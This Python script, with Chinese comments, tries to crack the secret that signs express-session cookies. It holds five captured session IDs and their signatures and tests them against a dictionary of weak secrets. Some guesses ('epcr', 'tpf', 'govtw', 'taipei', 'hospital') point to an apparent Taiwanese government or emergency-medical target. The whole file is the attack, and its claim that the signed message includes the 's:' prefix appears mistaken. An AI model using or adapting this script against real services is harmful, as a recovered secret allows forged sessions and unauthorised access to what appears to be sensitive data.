import hashlib
import hmac
import base64
import urllib.parse

# 5 个样本 sid 样本
sids = [
    "cYqiB7x2HOtaRWbpZteSL7d6HT45v25K",  # session_id
    "u2LfYoODZnNFrtJ2CgZaMYGaowmSeV8w",
    "ejofxQPPU1isvkXghwyC6VtfrzJICCai",
    "Uos1SWyCb4Q1bJmfTMVyhUa9RxbEoXP6",
    "H2HxT33WvhlQCqC-Iu0X_vjcBAKm3D_W",
]

# 提取真实签名（去掉 s%3A 前缀并 URL 解码）
signatures = [
    "LRICgHTwQePpWwp7RUu1HNkPz/1oCUqgOGnPrIhEkas",
    "BZEe76gTjixtQIIENYbCOkUy1ncMVTTG0mLlKL9E5Ao",
    "AD1cAmInUFEVi1T4sIhnIF1nmVjX3eTz0dDYD5mv9tA",
    "yvPrU44expfNkDbafz5nNzChumo5s/G8YIhFIZZYM6M",
    "xZWAw/3GfKrplvv2fUqMfi8or8fDUNDPKfbBQapqYM8",
]

# 扩展字典：常见弱密钥
candidates = [
    'secret', 'keyboard cat', '12345678', 'express', 'node', 'tpf',
    'epcr', 'govtw', 'emic', 'password', 'qwerty', 'admin', 'taipei',
    'session', 'cookie', 'connect', 'sid', 's%3A', '%3A',
    'app-secret', 'app_secret', 'session_secret', 'session-secret',
    'mySecret', 'my-secret', 'default', 'changeme', 'topsecret',
    'test', '12345', '123456', '123456789', 'abc123', 'letmein',
    'master', 'root', 'superuser', 'passw0rd', 'P@ssw0rd',
    'epcr-tpf', 'tpf-epcr', 'emic-tpf', 'tpf-emic',
    'ssologin', 'auth-secret', 'authServer', 'auth-server',
    'mer2', 'viewlead', 'hospital', 'pcr', 'tpf-secret',
    'my secret', 'keyboard cat', 'foo bar baz', 'hello world',
    'pass', 'publickey', 'privatekey', 'rsa', 'ed25519',
    'ssh-secret', 'server-secret', 'app.js', 'main.js',
    'EPCR_SECRET', 'TPF_SECRET', 'SESSION_SECRET', 'COOKIE_SECRET',
]

print(f"[*] 准备爆破 sid 签名 ({len(candidates)} 个候选密钥)")
print(f"[*] 5 个样本 sid 长度: {[len(s) for s in sids]}")
print(f"[*] 5 个签名长度: {[len(s) for s in signatures]}")
print()

found = []
for idx, (sid, sig) in enumerate(zip(sids, signatures)):
    for secret in candidates:
        # express-session 使用 HMAC-SHA256('s:' + sid, secret)
        message = ('s:' + sid).encode('utf-8')
        sig_bytes = hmac.new(secret.encode('utf-8'), message, hashlib.sha256).digest()
        sig_b64 = base64.b64encode(sig_bytes).decode('utf-8').rstrip('=')
        
        if sig_b64 == sig:
            print(f"[!!!] 样本 {idx+1} 命中密钥: {secret}")
            print(f"  sid: {sid}")
            print(f"  sig: {sig}")
            found.append((idx, secret))
            break

if not found:
    print("[-] 字典爆破未命中，需要扩展字典或考虑 sid 时序关联")
